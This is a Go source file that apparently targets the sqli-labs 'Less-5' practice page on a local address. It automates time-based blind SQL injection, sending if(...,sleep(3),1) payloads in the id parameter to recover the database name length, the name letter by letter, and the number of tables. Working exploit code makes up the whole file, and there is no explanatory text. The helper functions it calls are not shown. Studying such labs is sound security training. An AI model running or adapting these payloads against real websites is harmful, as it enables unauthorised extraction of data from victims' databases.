package main

import (
	"strconv"
)

func getDBLength() int {
	length := 1
	for {
		url := "http://192.168.0.11/Less-5/index.php?id=1%27%20and%20if(length(database())=%27" + strconv.Itoa(length) + "%27,sleep(3),1)%20--%20d"
		payload(url)
		if cost {
			break
		}
		length++
	}
	return length
}

func getDBName(length int, letters map[int]string, dbName chan<- string) {
	name := ""
re:
	for i := 1; i <= length; i++ {
		for _, letter := range letters {
			str := name
			str += letter
			url := "http://192.168.0.11/Less-5/index.php?id=1%27%20and%20if(left(database()," + strconv.Itoa(i) + ")=%27" + str + "%27,sleep(3),1)%20--%20d"
			payload(url)
			if cost {
				name += letter
				continue re
			}
		}
	}
	dbName <- name
}

func getDbAndTableCount(letters map[int]string) Info {
	length := 1
	name := ""
	for {
		url := "http://192.168.0.11/Less-5/index.php?id=1%27%20and%20if(length(database())=%27" + strconv.Itoa(length) + "%27,sleep(3),1)%20--%20d"
		payload(url)
		if cost {
			break
		}
		length++
	}

re:
	for i := 1; i <= length; i++ {
		for _, letter := range letters {
			str := name
			str += letter
			url := "http://192.168.0.11/Less-5/index.php?id=1%27%20and%20if(left(database()," + strconv.Itoa(i) + ")=%27" + str + "%27,sleep(3),1)%20--%20d"
			payload(url)
			if cost {
				name += letter
				continue re
			}
		}
	}
	subCount := 0
	for {
		tabnumUrl := "http://192.168.0.11/Less-5/index.php?id=1%27%20and%20if((select%20count(table_name)" +
			"from%20information_schema.tables%20where%20table_schema=database())=" + strconv.Itoa(subCount) + ",sleep(3),1)%20--%20d"
		payload(tabnumUrl)
		if cost {
			break
		}
		subCount++
	}
	return Info{name, length, subCount}
}
